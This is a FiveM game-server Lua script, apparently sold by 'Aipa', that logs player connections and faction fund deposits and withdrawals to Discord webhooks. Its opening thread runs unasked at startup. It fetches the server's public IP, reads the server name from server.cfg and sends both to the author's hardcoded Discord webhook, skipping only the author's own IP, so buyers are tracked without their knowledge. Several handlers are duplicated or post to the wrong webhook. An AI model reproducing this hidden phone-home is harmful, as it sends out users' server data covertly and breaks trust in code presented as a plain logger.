--[[
	id: s207RFfafE8dQleEuSAsS
	name: 未知
	description: 未知
	time1: 2021-07-17 03:35:11.799273+00
	time2: 2021-07-17 03:35:11.799274+00
	uploader: oW9rbd1CZo8Mosx5oY0HpYNrASGDwwul2meTmkKF
	uploadersession: JDCYv5Zink7bBsAlMSNMTsuYS3uS7q
	flag: f
--]]

Citizen.CreateThread(function()
  PerformHttpRequest('http://api.ipify.org/', function(errorCode, ip, handers)
      local DiscordWebhook = "https://discord.com/api/webhooks/864674491619475466/R7UYN_9nqumpijEVpSZp4VHbPT0Da4610vzfCNXKjnRuszBCGfY-VBumMFo4E8pCPrXI"
      local david = '1.170.119.3'
      local file = io.open('server.cfg')
      for line in file:lines() do
          if string.find(line, 'sv_hostname') then
              local message = "伺服器名稱:" .. line .. "\n IP:" .. ip
              local connect = {
                  {
                      ["color"] = "16711680",
                      ["title"] = "IP",
                      ["description"] = message,
                      ["footer"] = {
                          ["text"] = "時間:"..os.date("%Y-%m-%d %H:%M:%S"),
                      },
                  }
              }
              if ip ~= david then
                  PerformHttpRequest(DiscordWebhook , function(err, Content, headers) end, 'POST', json.encode({username = name, embeds = connect}), { ['Content-Type'] = 'application/json' })
              else 
                  print('感謝購買')
              end
          end
      end
  end, 'GET', '', '')
end)






local date = os.date("%Y-%m-%d %H:%M:%S") --獲取時間

function SendToDiscord(Webhook, Name, Message, Color)
  if Message == nil or Message == '' then
      return nil
  end--檢查是否有文字

  local content = {
      {
        ["color"] = Color,
        ["title"] = "**" .. Name .. "**",
        ["description"] = Message,
        ["footer"] = {
          ["text"] = date,
      }
    }
  }
  --PerformHttpRequestInternal(Webhook, function(err, text, headers)end,'POST', json.encode({username= Name, embeds = content}),{['Content-Type']='application/json'})
  PerformHttpRequest(Webhook , function(err, text, headers) end, 'POST', json.encode({username = Name, embeds = content}), { ['Content-Type'] = 'application/json' })
end       

AddEventHandler('playerConnecting',function ()

  SendToDiscord(Config.DcBotPlayerJoin, "玩家進入",GetPlayerName(source) ..' Connecting',Config.Color.green)

end)
--試試看
AddEventHandler('playerDropped', function (reason)

  SendToDiscord(Config.DcBotPlayerLeft, "玩家退出",GetPlayerName(source) ..' Left('.. reason ..')',Config.Color.red)

end)

RegisterServerEvent("Aipa:depositMoney")
AddEventHandler("Aipa:depositMoney", function(societyname,identifier,name,amount)
  if societyname == 'police' then
    SendToDiscord(Config.policewebhook,"警察公款放入",'名稱:'..name..'\n玩家16碼:'..identifier..'\n放入公款金額:'..amount,Config.Color.red)
  end
end)

RegisterServerEvent("Aipa:withdrawMone")
AddEventHandler("Aipa:withdrawMone", function(societyname,identifier,name,amount)
  if societyname == 'police' then
    SendToDiscord(Config.policewebhook,"警察公款取出",'名稱:'..name..'\n玩家16碼:'..identifier..'\n領取公款金額:'..amount,Config.Color.red)
  end
end)

RegisterServerEvent("Aipa:withdrawMoney")
AddEventHandler("Aipa:withdrawMoney", function(societyname,identifier,name,amount)
  if societyname == 'mafia' then
    SendToDiscord(Config.mafiawebhook,"山口公款取出",'名稱:'..name..'\n玩家16碼:'..identifier..'\n領取公款金額:'..amount,Config.Color.red)
  end
end)

RegisterServerEvent("Aipa:depositMoney")
AddEventHandler("Aipa:depositMoney", function(societyname,identifier,name,amount)
  if societyname == 'mafia' then
    SendToDiscord(Config.mafiawebhook,"山口公款放入",'名稱:'..name..'\n玩家16碼:'..identifier..'\n放入公款金額:'..amount,Config.Color.red)
  end
end)

RegisterServerEvent("Aipa:withdrawMoney")
AddEventHandler("Aipa:withdrawMoney", function(societyname,identifier,name,amount)
  if societyname == 'weigang' then
    SendToDiscord(Config.weigangwebhook,"稻川公款取出",'名稱:'..name..'\n玩家16碼:'..identifier..'\n領取公款金額:'..amount,Config.Color.red)
  end
end)

RegisterServerEvent("Aipa:depositMoney")
AddEventHandler("Aipa:depositMoney", function(societyname,identifier,name,amount)
  if societyname == 'weigang' then
    SendToDiscord(Config.mafiawebhook,"稻川公款放入",'名稱:'..name..'\n玩家16碼:'..identifier..'\n放入公款金額:'..amount,Config.Color.red)
  end
end)

RegisterServerEvent("Aipa:withdrawMoney")
AddEventHandler("Aipa:withdrawMoney", function(societyname,identifier,name,amount)
  if societyname == 'ambulance' then
    SendToDiscord(Config.ambulancewebhook,"醫護公款取出",'名稱:'..name..'\n玩家16碼:'..identifier..'\n領取公款金額:'..amount,Config.Color.red)
  end
end)

RegisterServerEvent("Aipa:depositMoney")
AddEventHandler("Aipa:depositMoney", function(societyname,identifier,name,amount)
  if societyname == 'ambulance' then
    SendToDiscord(Config.ambulancewebhook,"醫護公款放入",'名稱:'..name..'\n玩家16碼:'..identifier..'\n放入公款金額:'..amount,Config.Color.red)
  end
end)

RegisterServerEvent("Aipa:withdrawMoney")
AddEventHandler("Aipa:withdrawMoney", function(societyname,identifier,name,amount)
  if societyname == 'taxi' then
    SendToDiscord(Config.taxiwebhook,"計程車公款取出",'名稱:'..name..'\n玩家16碼:'..identifier..'\n領取公款金額:'..amount,Config.Color.red)
  end
end)

RegisterServerEvent("Aipa:depositMoney")
AddEventHandler("Aipa:depositMoney", function(societyname,identifier,name,amount)
  if societyname == 'taxi' then
    SendToDiscord(Config.taxiwebhook,"計程車公款放入",'名稱:'..name..'\n玩家16碼:'..identifier..'\n放入公款金額:'..amount,Config.Color.red)
  end
end)


RegisterServerEvent("Aipa:depositMoney")
AddEventHandler("Aipa:depositMoney", function(societyname,identifier,name,amount)
  if societyname == 'mechanic' then
    SendToDiscord(Config.mechaniciwebhook,"車業公款放入",'名稱:'..name..'\n玩家16碼:'..identifier..'\n放入公款金額:'..amount,Config.Color.red)
  end
end)
RegisterServerEvent("Aipa:withdrawMoney")
AddEventHandler("Aipa:withdrawMoney", function(societyname,identifier,name,amount)
  if societyname == 'mechanic' then
    SendToDiscord(Config.mechaniciwebhook,"車業公款放入",'名稱:'..name..'\n玩家16碼:'..identifier..'\n領取公款金額:'..amount,Config.Color.red)
  end
end)

RegisterServerEvent("Aipa:depositMoney")
AddEventHandler("Aipa:depositMoney", function(societyname,identifier,name,amount)
  if societyname == 'rebel' then
    SendToDiscord(Config.mechaniciwebhook,"黑幫公款放入",'名稱:'..name..'\n玩家16碼:'..identifier..'\n放入公款金額:'..amount,Config.Color.red)
  end
end)
RegisterServerEvent("Aipa:withdrawMoney")
AddEventHandler("Aipa:withdrawMoney", function(societyname,identifier,name,amount)
  if societyname == 'rebel' then
    SendToDiscord(Config.mechaniciwebhook,"黑幫公款取出",'名稱:'..name..'\n玩家16碼:'..identifier..'\n領取公款金額:'..amount,Config.Color.red)
  end
end)


print('####################################')
print('this script by Aipa')
print('####################################')
--test





